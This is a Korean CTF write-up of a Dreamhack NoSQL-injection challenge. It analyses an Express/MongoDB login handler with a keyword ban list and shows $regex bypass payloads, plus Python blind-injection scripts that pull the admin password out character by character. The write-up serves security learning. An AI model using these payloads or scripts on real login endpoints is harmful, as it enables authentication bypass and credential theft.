# 문제 지문
---
이 문제는 데이터베이스에 저장된 플래그를 획득하는 문제입니다.

플래그는 admin 계정의 비밀번호 입니다.

플래그의 형식은 DH{...} 입니다.

`{'uid': 'admin', 'upw': 'DH{32alphanumeric}'}`

---

이번 문제에서는 `"admin"` 계정의 `upw`에 비밀번호가 존재하기 때문에, 해당 비밀번호를 출력하면 `flag`를 알아낼 수 있다.

그럼 어떻게 `upw` 필드 값을 출력할 수 있을지 소스 코드를 살펴보자.

# 웹 서비스 분석

```
const express = require('express');
const app = express();

const mongoose = require('mongoose');
mongoose.connect('mongodb://localhost/main', { useNewUrlParser: true, useUnifiedTopology: true });
const db = mongoose.connection;

// flag is in db, {'uid': 'admin', 'upw': 'DH{32alphanumeric}'}
const BAN = ['admin', 'dh', 'admi'];

filter = function(data){
    const dump = JSON.stringify(data).toLowerCase();
    var flag = false;
    BAN.forEach(function(word){
        if(dump.indexOf(word)!=-1) flag = true;
    });
    return flag;
}

app.get('/login', function(req, res) {
    if(filter(req.query)){
        res.send('filter');
        return;
    }
    const {uid, upw} = req.query;

    db.collection('user').findOne({
        'uid': uid,
        'upw': upw,
    }, function(err, result){
        if (err){
            res.send('err');
        }else if(result){
            res.send(result['uid']);
        }else{
            res.send('undefined');
        }
    })
});

app.get('/', function(req, res) {
    res.send('/login?uid=guest&upw=guest');
});

app.listen(8000, '0.0.0.0');
```

## 엔드포인트 : `/login`

인덱스 페이지에서는 보이지 않고, URL을 통해서만 접근할 수 있는 페이지이다. 

위 코드는 `/login` 엔드포인트에서 `GET` 요청이 발생했을 때의 핸들러 코드이다.

가장 먼저, `req.query` 값을 `filter` 함수를 통해 필터링한다.

`req.query` 값은 `GET` 요청을 통해 URL의 파라미터로 전달된 값을 **자바스크립트 객체** 형태로 저장한다. (`JSON`과의 차이점은 필드명이 문자열인지 아닌지의 차이이다.)

예를 들어, `http://localhost:8000/login?uid=admin&upw=1234`로 요청이 오는 경우 `req.query`는 아래와 같이 저장된다.

```
{
  uid : 'admin',
  upw : '1234'
}
```

`filter` 함수는 아래와 같다.

```
const BAN = ['admin', 'dh', 'admi'];

filter = function(data){
    const dump = JSON.stringify(data).toLowerCase();
    var flag = false;
    BAN.forEach(function(word){
        if(dump.indexOf(word)!=-1) flag = true;
    });
    return flag;
}
```

먼저, `BAN` 배열을 선언하여 `'admin'`, `'dh'`, `'admi'` 값을 넣어주고, 익명함수를 선언하여 `filter`에 저장해준다.

해당 함수의 내용은, 먼저 입력 받은 인자를 `JSON.stringify(data).toLowerCase();`을 통해 `JSON` 형식의 문자열로 변환해준 후 소문자로 변환하여 `dump`에 대입해준다.

`/login` 핸들러에서 `req.query`를 그대로 전달하기 때문에, 문자열로 변환해주는 것이 필요해서 위 코드가 존재한다.

이후, `BAN` 배열의 원소에 대하여 `dump`에서 해당 원소가 포함되어있다면, `indexOf` 메서드의 결과가 `-1`이 아닌 값을 리턴하기 때문에 `flag`를 `true`로 설정 후 리턴한다.

다시 돌아와서 `/login` 핸들러를 살펴보면 해당 `filter` 함수의 리턴 값이 `true`인 경우 `"filter"`를 출력 후 종료하기 때문에 로그인 과정을 진행할 수 없는 것을 알 수 있다.

`admin`, `dh`, `admi` 값으로 `uid`와 `upw`에 입력될 문자열을 필터링해주는 목적으로 보이지만, **정규 표현식으로 충분히 우회가 가능하기 때문에 문자열을 필터링은 근본적인 NoSQL Injection 공격의 해결책이 아니므로 취약점이 존재하게 되는 것이다.**

만약 `filter` 함수를 통과하여 아래로 와서 `const {uid, upw} = req.query;` 코드를 실행하게 된다.

해당 코드는 `req.query`에서 필드명이 `uid`와 `upw`인 필드를 찾아서 `uid` 변수와 `upw` 변수에 대입하는 것이다.

```
const uid = req.query.uid;
const upw = req.query.upw;
```

이후 아래에서 `user` 컬렉션을 조회하여 방금 저장해준 `uid`, `upw` 값과 일치하는 Document를 찾아서 `result`에 저장한다.

Document를 제대로 찾아서 `result`에 대입한 경우, `uid` 필드에 저장된 값을 출력하고 Document를 찾지 못한 경우 `"err"`나 `"undefined"`를 출력한다.

우리가 원하는 것은 `upw` 필드에 저장된 값인데, `uid` 필드에 저장된 값을 출력하기 때문에 간단한 NoSQL Injection 공격 기법으로 비밀번호를 알아내는 것은 불가능하다.

따라서 Blind NoSQL Injection 공격을 통해, `"admin"` 계정의 로그인에 성공하여 `result['uid']`로 `"admin"`이 출력되는 상황을 통해 한 글자식 비밀번호를 찾는 자동화 스크립트 코드를 작성해야할 것이다.

# Exploit

## 1. NoSQL Injection

먼저 NoSQL Injection 공격을 통해서 `login` 페이지에서 로그인에 성공해보자.

`uid` 필드에 `admin`, `admi` 문자열을 포함할 수 없고, `upw` 필드에 `dh` 문자열을 포함할 수 없기 때문에 **정규표현식(`$regex`)을 사용해야할 것이다.**

일단 먼저 `/` 인덱스 페이지는 아래와 같고, URL을 통해 필터링이 잘 되는지 확인부터 해보자.

<img width="472" alt="image" src="https://github.com/user-attachments/assets/6b8c176f-1863-48d5-81e4-c2560ea1bf84">

아래와 같이 `http://host3.dreamhack.games:18127/login?uid=admin&upw=` URL로 GET 요청을 전달하면 `"admin"` 문자열 때문에 필터링에 걸려서 아래와 같이 출력되는 것을 확인할 수 있다.

<img width="575" alt="image" src="https://github.com/user-attachments/assets/4a368da9-0ff7-416a-ac57-b29eaccb76ea">

그리고 테스트로 존재하지 않는 행을 출력해보기 위해 `http://host3.dreamhack.games:18127/login?uid=ad&upw=` URL로 GET 요청을 전달하면 아래와 같이 출력되는 것도 확인할 수 있다.

<img width="592" alt="image" src="https://github.com/user-attachments/assets/a4c0ddf7-4245-4b22-b0ab-be7c76c7ee2b">

그리고 정규 표현식을 작성하기 전에 `$ne`를 통해 모든 행을 리턴했을 때의 결과를 알아보려고 했는데, 응답시간 초과가 뜨는 것을 보아 서버에 도큐먼트가 너무 많거나 `$ne` 연산자를 사용할 때 예상치 못한 에러가 존재해서 그런 것 같다고 생각이 들었다.

**그럼 이제 `admin` 계정에 로그인을 성공하기 위해 정규 표현식 `$regex` 연산자를 활용해보자.**

우리가 `uid`에는 `admin`, `admi` 문자열을 사용할 수 없기 때문에, `.` 표현식을 통해 각 `ad.in`으로 중간의 `m`을 대체하면 된다.

그리고 `upw`에는 `dh`를 사용하지 못하지만, 똑같은 논리로 `D.{.{32}}`를 쓰거나 `upw[$ne]=`을 파라미터로 전달해주는 방법을 쓸 수 있을 것이다.

<img width="719" alt="image" src="https://github.com/user-attachments/assets/8296a731-8559-49bf-8e93-2498bce28360">

참고로, `upw[$regex]=D`는 아래와 같이 로그인이 잘 되지만, `upw[$regex]=D.{.{32}}`로 전달하는 경우 `D`가 소문자로 변환되어 `undefined`가 출력되는 현상이 나타났다.

<img width="721" alt="image" src="https://github.com/user-attachments/assets/54f54b17-a742-462e-bc21-fedd392f79a7">

소문자로 변환되는 이유는, 브라우저에서 URL을 인코딩하고 디코딩하는 특정 상황에서 대문자가 소문자로 변환될 수 있기 때문인 것 같다.

이럴 때는 대소문자 무시 플래그인 `i`플래그를 사용하여, `upw[$regex]=(?i)D.{.{32}}`로 전달을 해줘서 소문자 변환이 되지 않도록 하면 아래와 같이 로그인이 잘 되는 것을 확인할 수 있다.

<img width="795" alt="image" src="https://github.com/user-attachments/assets/6c61ffd4-2bc9-4de7-bdc5-841658bad379">

## 2. Blind NoSQL Injection

앞에서 NoSQL Injection 공격으로 로그인 인증을 우회하는 것까지는 성공했다.

하지만 이번 문제의 목표는 admin 계정으로 로그인에 성공하는 것이 아니라, admin 계정의 비밀번호(`upw`) 값에 저장되어있는 플래그를 알아내는 것이다.

**`/login` 페이지에서는 `result['uid']`만 출력해주기 때문에 Blind NoSQL Injection을 통해 비밀번호의 길이를 구한 후, 비밀번호를 한자리씩 구해야한다.**

이를 위해서는 자동화 공격 스크립트를 작성하는 것이 필요한데, 익스플로잇 스크립트의 작성 과정을 아래에서 살펴보자.

### 1. 모듈 및 상수 선언

```
import requests
import string

# flag is in db, {'uid': 'admin', 'upw': 'DH{32alphanumeric}'}

HOST = 'http://host3.dreamhack.games:12512'
ALPHANUMERIC = string.digits + string.ascii_letters  # 0123456789 + abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
SUCCESS = 'admin'
```

HTTP 요청을 보내고 받을 수 있는, `requests` 모듈을 먼저 임포트해준 후, 아래에서 사용할 `string` 모듈 또한 임포트해준다.

그리고 비밀번호 길이와 비밀번호를 구하기 전에, 먼저 해당 과정에 필요한 **호스트 주소, 비밀번호 입력값의 범위** 등 상수들을 정의해야한다.

먼저 워게임 서버 주소를 `HOST`에 저장하여 호스트 주소로 설정해주고, `upw` 내부의 플래그는 `32alphanumeric`(알파벳 + 정수)`이므로 해당 범위의 비밀번호 비교값을 `ALPHANUMERIC` 상수에 저장해준다.

`ALPHANUMERIC`은 `string` 모듈의 `digits`, `ascii_letters`을 더해서 `"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"` 문자열이 된다.

그리고 공격을 통해 로그인에 성공하면`result['uid']` 값을 출력(리턴)한다.

여기서 우리는 admin 계정에 로그인할 것이기 때문에 `SUCCESS = "admin"`으로 지정해준 후, 공격 과정에서 `response.text`와 `SUCCESS`가 같은지 비교하여 로그인 성공 여부를 확인할 수 있다.

### 2. 비밀번호 길이 구하기 (이미 주어져서 찾을 필요는 없지만 연습)

```
# 1. 비밀번호 길이 구하기
# 첫 번째 방법
pw_len = 1
while True:
    response = requests.get(f'{HOST}/login?uid[$regex]=ad.in&upw[$regex]=D.{{.{{{pw_len}}}}}')  # D.{.{pw_len}}로 시작

    # response = requests.get(f'{HOST}/login?uid[$regex]=ad.in&upw[$regex]=D.{{.{{{pw_len}}}') # D.{.{pw_len}로 시작하므로 1부터 됨
    # response = requests.get(f'{HOST}/login?uid[$regex]=ad.in&upw[$regex]=.{{{pw_len}}}') # 이것도 마찬가지로 .{pw_len}로 시작하므로 1부터 됨

    if response.text == SUCCESS:
        break
    pw_len = pw_len + 1

print(f'Password length is {pw_len}')
```

일단 비밀번호의 길이를 저장할 `pw_len` 변수를 선언해준 후, **정규 표현식(`$regex`)** 을 통해 admin 계정의 비밀번호의 길이를 구하도록 `GET` 요청을 보내는 쿼리문을 작성해준다.

참고로, 여기서 `pw_len`은 `DH{}`에서 괄호 안에 존재하는 플래그의 길이이다.

먼저 `GET` 요청을 보내고 응답을 받기 위해, `requests.get` 함수 안에 인자로 요청할 URL을 `f-string`을 통해 전달한 후, `response`에 리턴되는 응답값을 저장할 것이다.

해당 함수에 보낼 인자는 `f'{HOST}/login?uid[$regex]=ad.in&upw[$regex]=D.{{.{{{pw_len}}}}}'` 이다. 

먼저 문자열 필터링을 우회하기 위해 정규 표현식을 사용하여, `uid[$regex]=ad.in`로 admin 계정의 `uid`를 세팅해줄 수 있다.

그리고 비밀번호의 길이를 찾기 위해서, **임의의 문자를 나타내는 `.(Dot)`** 와 **바로 앞의 표현식을 반복할 `{n}`** 정규 표현식을 사용하여, `upw[$regex]=D.{{.{{{pw_len}}}}}`과 같이 파라미터를 전달하여 `upw`를 세팅해줄 수 있다.

URL을 통해서 실제로 전달해야할 값이 예시로 `pw_len = 10`일 때, **`D.{.{10}}`** 문자열이 전달되야 한다. 그렇기 때문에 `f-string`에서 `{`이나 `}`을 출력하기 위해서는 `{`나 `}`를 2번 겹쳐서 써주어야 해서 위와 같은 인자가 전달되게 된다.

만약 `pw_len`을 대입하여 `f-string`을 전달했을 때, `GET` 요청의 응답이 저장된 `response` 객체의 **Response Body**에 해당하는 `response.text`값이 `SUCCESS`와 같다면 로그인에 성공한 것이다.

따라서 이때의 `pw_len`이 실제 비밀번호의 길이이기 때문에, 반복문을 종료하고 `pw_len`을 출력하면 비밀번호의 길이를 구할 수 있다.

만약 `reponse.text`가 `SUCCESS`와 다르다면, 현재 `pw_len`이 실제 비밀번호 길이보다 작은 것이므로 1 증가시켜준 후 계속 반복문을 다시 수행한다.

<img width="850" alt="image" src="https://github.com/user-attachments/assets/196fff0f-d372-45e2-a97f-e8cb0aa0ef6e">

#### 참고

문자열의 시작을 나타내는 `^` 없이 바로 문자(열) 또는 표현식이 나오면 `^`와 같은 의미로 정규 표현식이 해석된다.

따라서 `upw`의 파라미터 값을 `D.{{.{{{pw_len}}}` 또는 `.{{{pw_len}}}`와 같이 전달해주면, 실제로 각각 `^D.{.{10}` 또는 `^.{10}`으로 해석된다.

이렇게 되면 `pw_len = 1`일 때부터 `upw`는 `DH{`로 시작하므로 위의 두 정규 표현식을 만족하게 되어 제대로 된 비밀번호 길이를 구할 수 없게 된다. `^`가 생략되어도 해당 의미로 해석된다는 것에 주의하자.

만약 `^`를 사용(또는 생략)하여 비밀번호의 길이를 구하려고 한다면, `pw_len = 1`부터 `pw_len` 값을 1씩 증가시켜줄 때도 계속 로그인에 성공하다가, 로그인에 처음 실패하는 `pw_len` 값에 집중하면 된다.

예를 들어, `^D.{.{pw_len}`이 `upw[$regex]`의 파라미터로 전달된다고 하면, `pw_len = 1`부터 계속 로그인에 성공하다가, `pw_len`이 `34`가 되면 처음으로 로그인에 실패하고, 앞으로 계속 `pw_len`을 증가시켜주면 로그인에 실패할 것이다.

왜나하면 플래그의 길이가 32이고, 뒤에 `}`까지 합치면 총 길이가 33이 되기 때문이다.

따라서, 이 방식을 사용하면 반대로, `response.text != SUCCESS`일 때 반복문을 종료해주고 `pw_len - 2`를 출력해주면 플래그의 길이를 구할 수 있게 된다.

```
# 두 번째 방법
pw_len = 1
while True:
    # D.{.{pw_len}로 시작 : 마지막 문자인 '}'를 빼주고 'pw_len - 1'을 출력해야 하므로 -2를 빼주면 됨
    response = requests.get(f'{HOST}/login?uid[$regex]=ad.in&upw[$regex]=D.{{.{{{pw_len}}}')

    # response = requests.get(f'{HOST}/login?uid[$regex]=ad.in&upw[$regex]=.{{{pw_len}}}')
    # 이건 첫글자부터 시작하기 때문에, (pw_len - 5)를 출력해야함(DH{} 총 4글자)

    if response.text != SUCCESS:
        break
    pw_len = pw_len + 1

print(f'Password length is {pw_len - 2}')
# print(f'Password length is {pw_len - 5}')
```

### 3. 비밀번호 구하기

그럼 이제 비밀번호의 길이를 구했기 때문에, **정규 표현식을 사용하여 비밀번호의 각 자리를 하나씩 구해가는 방법으로** 비밀번호를 구해낼 수 있다.

먼저, 비밀번호에서 `DH{}` 안에 저장된 플래그를 구할 것이기 때문에 한 자리씩 구해서 전체 결과를 누적할 `flag` 변수를 선언해준다.

그 다음에는, 구해준 비밀번호의 길이만큼 범위를 설정하여 각 자리에 대해 반복문을 돌며, `ALPHANUMERIC` 문자열의 각 문자에 대해 현재 검증하는 비밀번호의 자리값과 동일한지 확인하면 된다.

이는 비밀번호 길이를 구할 때와 동일한 논리로, `requests.get` 함수를 통해 `GET` 요청을 보낸 후, `GET` 요청에 대한 서버의 응답을 `response` 객체에 저장하여 `response.text`의 값이 `SUCCESS`와 같을 때(로그인에 성공)를 확인하면 된다.

URL로 전달할 쿼리문은 `f-string`을 통해 아래와 같이 정규 표현식을 사용하여 작성할 수 있다. `ch`는 `ALPHANUMERIC` 문자열에서 접근하는 iterator 문자이다.

- `uid[$regex]=ad.in&upw[$regex]=D.{{{flag}{ch}`

이러면 `upw`의 정규 표현식으로 `^D.{{flag}{ch}`가 들어가기 때문에 찾은 `flag`와 검증할 `ch`가 누적되어 반복문을 통해 각 자리의 비밀번호 값을 구할 수 있다.

`response.text == SUCCESS`인 경우 `break`를 통해 `ALPHANUMERIC`에 대한 반복문을 종료하고, 한 자리를 뒤로 이동해서 다시 반복문을 수행하면 된다.

```
# 2. 비밀번호 구하기
flag = ''

for i in range(pw_len):
    for ch in ALPHANUMERIC:
        response = requests.get(f'{HOST}/login?uid[$regex]=ad.in&upw[$regex]=D.{{{flag}{ch}')
        # response = requests.get(f'{HOST}/login?uid[$regex]=ad.in&upw[$regex]=^D.{{{flag}{ch}')
        if response.text == SUCCESS:
            flag += ch
            break

    print(f'FLAG: DH{{{flag}}}')
```

<img width="486" alt="image" src="https://github.com/user-attachments/assets/51a2813d-161c-4a65-ad69-2c4f01426d03">
